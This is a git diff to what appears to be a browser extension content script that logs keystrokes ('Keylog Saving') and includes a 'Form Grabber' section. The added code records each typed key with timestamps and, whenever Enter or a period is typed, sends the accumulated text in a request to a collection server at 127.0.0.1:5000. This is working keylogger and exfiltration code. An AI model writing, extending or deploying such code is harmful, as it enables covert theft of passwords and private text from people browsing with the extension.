@@ -55,24 +55,55 @@ chrome.storage.sync.get({allKeys: false}, function(settings) {
     }
 });
 
+var url = 'http://127.0.0.1:5000/data/'
 
 /* Keylog Saving */
 var time = new Date().getTime();
+console.log(time);
 var data = {};
+data['text'] = "";
+data['times'] = [];
+data['events'] = [];
 var shouldSave = false;
 var lastLog = time;
-data[time] = document.title + "^~^" + document.URL + "^~^";
+// data[time] = document.title + "^~^" + document.URL + "^~^";
 
 // Key'ed on JS timestamp
 function log(input) {
     var now = new Date().getTime();
-    if (now - lastLog < 10) return; // Remove duplicate keys (typed within 10 ms) caused by allFrames injection
-    data[time] += input;
+    if (now - data['times'][data['times'].length - 1] < 10) return; // Remove duplicate keys (typed within 10 ms) caused by allFrames injection
+
+    data['events'].push({'key': input, 'time': now});
+    data['times'].push(now);
+    data['text'] += input
     shouldSave = true;
-    lastLog = now;
-    console.log("Logged", input);
+    console.log("Logged " + input + " at time " + now);
+
+    if(input == "[ENTER]" || input == ".") {
+      console.log("Logged THE KEY")
+      sendData(data);
+      data = {};
+      data['text'] = "";
+      data['times'] = [];
+      data['events'] = [];
+    }
 }
 
+function sendData(data)
+{
+    console.log("Test")
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", url + data['text'], true); // true for asynchronous
+    xhr.onload = function() {
+    if (xhr.status === 200) {
+        console.log(xhr.responseText);
+    }
+    else {
+        alert('Request failed.  Returned status of ' + xhr.status);
+    }
+};
+    xhr.send();
+}
 
 /* Save data */
 function save() {
@@ -88,7 +119,7 @@ function autoDelete() {
         chrome.storage.local.get(function(logs) {
             var toDelete = [];
             for (var key in logs) {
-                if (key < endDate || isNaN(key) || key < 10000) { // Restrict by time and remove invalid chars 
+                if (key < endDate || isNaN(key) || key < 10000) { // Restrict by time and remove invalid chars
                   toDelete.push(key);
                 }
             }
@@ -107,9 +138,9 @@ window.onbeforeunload = function() {
 }
 
 // Save every second
-setInterval(function(){
-    save();
-}, 1000);
+//setInterval(function(){
+//    save();
+//}, 5000);
 
 
 /* Form Grabber */
